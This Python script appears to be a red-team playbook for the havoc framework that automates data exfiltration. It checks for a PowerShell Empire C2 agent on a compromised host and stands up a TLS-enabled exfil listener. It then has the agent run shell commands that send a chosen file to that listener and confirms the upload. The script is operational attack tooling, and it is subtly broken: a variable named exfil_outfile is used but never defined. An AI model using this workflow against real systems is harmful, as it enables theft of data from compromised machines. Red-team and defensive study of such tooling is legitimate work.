# Import the supporting Python packages.
import re
import os
import string
import random
import pprint
import time as t
import argparse
from datetime import datetime
from configparser import ConfigParser

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - Simple Exfil')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the ./HAVOC configuration file
havoc_config = ConfigParser()
havoc_config_file = os.path.expanduser('~/.havoc/config')
havoc_config.read(havoc_config_file)

# Get api_key and secret_key
if profile:
    api_key = havoc_config.get(profile, 'API_KEY')
    secret = havoc_config.get(profile, 'SECRET')
    api_region = havoc_config.get(profile, 'API_REGION')
    api_domain_name = havoc_config.get(profile, 'API_DOMAIN_NAME')
    campaign_admin_email = havoc_config.get(profile, 'CAMPAIGN_ADMIN_EMAIL')
else:
    api_key = havoc_config.get('default', 'API_KEY')
    secret = havoc_config.get('default', 'SECRET')
    api_region = havoc_config.get('default', 'API_REGION')
    api_domain_name = havoc_config.get('default', 'API_DOMAIN_NAME')
    campaign_admin_email = havoc_config.get('default', 'CAMPAIGN_ADMIN_EMAIL')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/simple_exfil/simple_exfil.ini')

exfil_type = config.get('exfil_task', 'exfil_type')
exfil_port = config.get('exfil_task', 'exfil_port')
exfil_tls = config.get('exfil_task', 'tls')
exfil_task_test_certificate = config.get('exfil_task', 'test_certificate')
exfil_task_domain_name = config.get('exfil_task', 'domain_name')
exfil_cert_subj = config.get('exfil_task', 'cert_subj')
c2_task_name = config.get('c2_task', 'task_name')
c2_agent_name = config.get('c2_task', 'agent_name')
exfil_file = config.get('exfil_actions', 'exfil_file')
exfil_file_path = config.get('exfil_actions', 'exfil_file_path')
exfil_file_size = config.get('exfil_actions', 'exfil_file_size')
command_list = config.get('exfil_actions', 'command_list')

exfil_task_exists = None
exfil_portgroup_exists = None
exfil_service_exists = None


def clean_up():
    if exfil_task_exists:
        print(f'\nShutting down Exfil task {exfil_task_exists}.\n')
        task_shutdown_response = h.task_shutdown(exfil_task_exists)
        if 'completed' not in task_shutdown_response:
            print(f'Task shutdown for {exfil_task_exists} failed.\n')
            print(task_shutdown_response)
            exit('\nExiting.')
        t.sleep(5)

    if exfil_portgroup_exists:
        # Delete the Exfil portgroup.
        print(f'\nDeleting the {exfil_portgroup_exists} portgroup.')
        h.delete_portgroup(exfil_portgroup_exists)

    # All done.
    exit('\nDone... Exiting.\n')


# Verify c2_task exists
print(f'\nVerifying that C2 task {c2_task_name} exists.')
c2_task = h.verify_task(c2_task_name, 'powershell_empire')
if c2_task:
    print(f'C2 task {c2_task_name} found.')
else:
    exit(f'No powershell_empire task with name {c2_task_name} was found. Exiting...')

# Verify that the C2 agent exists.
print(f'\nVerifying that agent {c2_agent_name} exists.')
agent = h.verify_agent(c2_task_name, c2_agent_name)
agent_ip = None
if agent:
    agent_ip = agent['external_ip']
    print(f'Agent {c2_agent_name} exists. Continuing...\n')
else:
    exit(f'Agent {c2_agent_name} not found. Exiting...\n')

# Create a portgroup for the Exfil task.
print(f'\nCreating a portgroup for the Exfil task.')
h.create_portgroup(f'exfil_{exfil_type}_{sdate}', f'Allows port {exfil_port} traffic')
print(f'\nAdding portgroup rule to allow agent IP {agent_ip} to reach port {exfil_port}.\n')
h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'tcp')
h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', f'{agent_ip}/32', exfil_port, 'udp')
exfil_portgroup_exists = f'exfil_{exfil_type}_{sdate}'

# Launch an Exfil task
exfil_task_name = f'exfil_{exfil_type}_{sdate}'
portgroups = [f'exfil_{exfil_type}_{sdate}']
if exfil_task_domain_name == 'None':
    exfil_task_host_name = 'None'
else:
    exfil_task_host_name = 'exfil-' + ''.join(random.choice(string.ascii_lowercase) for i in range(5))
print(f'\nLaunching exfil task with name {exfil_task_name}.')
exfil_task = h.task_startup(
    exfil_task_name,
    'exfilkit',
    task_host_name=exfil_task_host_name,
    task_domain_name=exfil_task_domain_name,
    portgroups=portgroups
)
exfil_task_exists = exfil_task_name
exfil_task_ip = exfil_task['attack_ip']
print(f'\nThe exfil task is ready with the following parameters:')
print(f'\nIP - {exfil_task_ip}')
print(f'\nHost name - {exfil_task_host_name}')
print(f'\nDomain name - {exfil_task_domain_name}')

# Use a random string for the exfil_listener instruct_instance.
exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested for exfil service, generate a certificate.
if exfil_type.lower() == 'http' and exfil_tls.lower() == 'true':
    print('\nGenerating a certificate to support a TLS web service.')
    instruct_args = None
    if exfil_task_domain_name != 'None':
        print('Exfil task domain is configured. Requesting a Let\'s Encrypt certificate...\n')
        print('Temporarily opening port 80 for certificate request verification.\n')
        h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'add', '0.0.0.0/0', '80', 'tcp')
        print('Starting certificate request.\n')
        exfil_domain = f'{exfil_task_host_name}.{exfil_task_domain_name}'
        if exfil_task_test_certificate.lower() == 'true':
            exfil_test_cert = 'True'
        else:
            exfil_test_cert = 'False'
        instruct_args = {'domain': exfil_domain, 'email': campaign_admin_email, 'test_cert': exfil_test_cert}
        instruct_command = 'cert_gen'
        cert_gen = h.interact_with_task(exfil_task_name, instruct_command, exfil_instruct_instance, instruct_args)
        if cert_gen['outcome'] == 'success':
            print('Certificate request succeeded.\n')
            print('Closing port 80.\n')
            h.update_portgroup_rule(f'exfil_{exfil_type}_{sdate}', 'remove', '0.0.0.0/0', '80', 'tcp')
        else:
            print('Certificate request failed with response:\n')
            print(cert_gen)
            print('\nExiting...')
            clean_up()
    if exfil_task_domain_name == 'None':
        print('No Exfil task domain configured. Creating a self-signed certificate...\n')
        exfil_subj = re.sub('\$HOST', f'{exfil_task_ip}', exfil_cert_subj)
        instruct_args = {'subj': exfil_subj}
        instruct_command = 'cert_gen'
        cert_gen = h.interact_with_task(exfil_task_name, instruct_command, exfil_instruct_instance, instruct_args)
        if cert_gen['outcome'] == 'success':
            print('Self-signed certificate creation succeeded.\n')
        else:
            print('Self-signed certificate creation failed with response:\n')
            print(cert_gen)
            print('\nExiting...')
            clean_up()

# Ask the exfil_task to start an exfil listener service.
print(f'\nStarting an {exfil_type} exfil listener service on {exfil_task_name}.')
instruct_args = {'listen_port': int(exfil_port)}
instruct_command = f'start_{exfil_type}_exfil_server'
exfil_listener = h.interact_with_task(exfil_task_name, instruct_command, exfil_instruct_instance, instruct_args)
if exfil_listener['outcome'] == 'success':
    print(f'\nstart_{exfil_type}_exfil_server succeeded.\n')
    exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
else:
    print(f'\nstart_{exfil_type}_exfil_server failed. Exfil listener output:\n')
    print(exfil_listener)
    print('\nExiting...\n')
    clean_up()

# Setup exfil host.
if exfil_task_domain_name != 'None':
    exfil_host = f'{exfil_task_host_name}.{exfil_task_domain_name}'
else:
    exfil_host = exfil_task_ip

# Execute a list of shell commands on the agent.
for command in command_list.split(', '):
    # Replace variables in shell_command
    exfil_file_path_insert = re.sub('\$EXFIL_FILE_PATH', exfil_file_path, command)
    exfil_file_insert = re.sub('\$EXFIL_FILE', exfil_file, exfil_file_path_insert)
    exfil_file_size_insert = re.sub('\$EXFIL_FILE_SIZE', exfil_file_size, exfil_file_insert)
    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_file_size_insert)
    if exfil_tls.lower() == 'true':
        exfil_tls_insert = re.sub('\$TLS', 's', exfil_type_insert)
    else:
        exfil_tls_insert = re.sub('\$TLS', '', exfil_type_insert)
    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_tls_insert)
    shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
    print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
    try:
        shell_command_results = h.execute_agent_shell_command(c2_task_name, c2_agent_name, shell_command)
        print(f'{shell_command} results:\n')
        print(shell_command_results)
    except KeyboardInterrupt:
        print('Interrupting execute_agent_shell_command. Skipping to next command...')

    # Wait for the powershell_empire task to become idle.
    print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
    try:
        h.wait_for_idle_task(c2_task_name)
    except KeyboardInterrupt:
        exit('Interrupting wait_for_idle_task. Exiting...')
    print(f'{c2_task_name} is now idle.')
    
# Confirm that exfil was successful.
# Use a random string for the exfil_listener instruct_instance.
confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
instruct_command = 'ls'
ls_command = h.interact_with_task(exfil_task_name, instruct_command, confirm_exfil_instruct_instance)
if ls_command['outcome'] == 'success':
    dir_contents = ls_command['local_directory_contents']
    if exfil_outfile in dir_contents:
        print(f'\nUpload of {exfil_outfile} succeeded.\n')
        print(f'{exfil_task_name} local directory contents:\n')
        pp.pprint(dir_contents)
    else:
        print(f'\nUpload of {exfil_outfile} failed.\n')
        print(f'{exfil_task_name} local directory contents:\n')
        pp.pprint(dir_contents)
else:
    print(f'\nCould not list local directory contents for task {exfil_task_name}.\n')

# Playbook is complete.
print('\nPlaybook operation completed. Cleaning up...')
clean_up()
